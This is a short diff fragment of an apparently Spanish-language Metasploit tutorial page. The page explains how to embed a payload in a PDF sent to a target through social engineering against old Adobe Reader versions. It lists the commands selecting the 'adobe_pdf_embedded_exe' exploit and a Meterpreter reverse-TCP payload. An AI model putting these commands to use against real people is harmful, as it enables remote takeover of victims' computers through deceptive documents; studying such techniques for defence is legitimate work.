@@ -6,7 +6,7 @@ Vídeo:
 Explicación: Incrusta una Carga (payload) dentro un archivo PDF existente. El archivo PDF resultante puede ser enviado al objetivo como parte de un ataque de ingeniería social.
 
 Sistema Operativo: Windows XP SP3 (Inglés/Español) / Windows Vista / Windows 7 (Inglés)
-Programas: Adobe Reader v8.x, v9.x
+Programas: Adobe Reader v8.x, v9.x <br />
 <br />
 use exploit/windows/fileformat/adobe_pdf_embedded_exe <br />
 set payload windows/meterpreter/reverse_tcp <br />
